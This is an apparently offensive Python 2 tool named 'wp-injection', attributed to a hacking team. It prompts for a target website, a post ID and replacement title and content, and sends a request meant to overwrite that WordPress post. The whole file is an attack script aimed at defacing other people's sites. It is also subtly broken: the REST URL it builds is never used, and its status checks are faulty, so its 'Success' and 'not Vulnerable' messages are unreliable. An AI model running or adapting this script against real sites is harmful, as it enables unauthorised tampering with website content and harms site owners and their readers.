 import time,json,sys,os,random,requests

def mulai():
 try:
    os.system("clear")
    time.sleep(0.9)
    print "=====================================================\n"
    os.system("figlet wp-injection | lolcat")
    print
    print "\033[96mAuthor\033[00m:\033[95m r00t@star\033[00m"
    print "\033[96mTeam\033[00m:\033[95m Sunda Cyber Army"
    print "\033[96mNote\033[00m:\033[95m If Error Please Contact Me\033[93m(in Readme.md)\033[00m"
    print "=====================================================\n"
    targeturi = raw_input("\033[92mEnter Target URI \033[00m(\033[91mEx : http://sitetarget.com\033[00m)\033[92m ->\033[00m ")
    postid = raw_input("\033[92mEnter Post ID ->\033[00m ")
    titlee = raw_input("\033[92mCreate Your Title ->\033[00m ")
    contentt = raw_input("\033[92mCrete Your Content ->\033[00m ")
    url = "%s/wp-json/wp/v2/posts/%s"%(targeturi,postid)
 except IOError:
    print "\033[00m[\033[91m!\033[00m]\033[91m Please Enter The Input\033[00m"
    sys.exit()
 except KeyboardInterrupt:
    print "\033[00m[\033[91m!\033[00m]\033[91m Please Enter The Input\033[00m"
    sys.exit()
 try:
    data = {"id":targeturi,"title":titlee,"content":contentt}
    header = {"content_type":"json","accept":"json"}
    response = requests.post("%s/index.php?p=%s"%(targeturi,postid), data=data, headers=header)
    if 200 in response:
        print "\033[92m"+targeturi+"/index.php?p="+postid+"\033[00m>> \033[96m Success"
    if 403 in response:
        print "\033[92m"+targeturi+"/index.php?p="+postid+"\033[00m>> \033[96m Access Denied !"
    if 404 in response:
        print "\033[92m"+targeturi+"/index.php?p="+postid+"\033[00m>> \033[96m Not Found !"
    else:
        print "\033[91mThis site\033[00m (\033[00m"+targeturi+") \033[91m is not Vulnerable\033[00m"
        sys.exit()
 except KeyboardInterrupt:
    print "\033[00m[\033[91m!\033[00m]\033[91m Please Enter the input\033[00m"
    sys.exit()
 except IOError:
    print "\033[00m[\033[91m!\033[00m]\033[91m Please Enter the input\033[00m"
    sys.exit()
 else:
      print "\033[00m[\033[91m!\033[00m]\033[94m Why you don't enter the input?\033[00m"
      sar = raw_input("\033[92mAre You want to back?[Ya/no] ->\033[93m ")
      if sar == "Ya":
          mulai()
      if sar == "no":
          print "\033[91 Thank you for visiting this program :) \033[00m"
          sys.exit()
def importt():
 try:
   import requests
 except ImportError:
    print '---------------------------------------------------'
    print '  \033[00m[\033[91m*\033[00m] \033[92m pip install requests'
    print '   \033[00m[\033[91m-\033[00m]\033[92m  you need to install requests Module\033[00m'
    sys.exit()
 else:
    mulai()
importt()
          
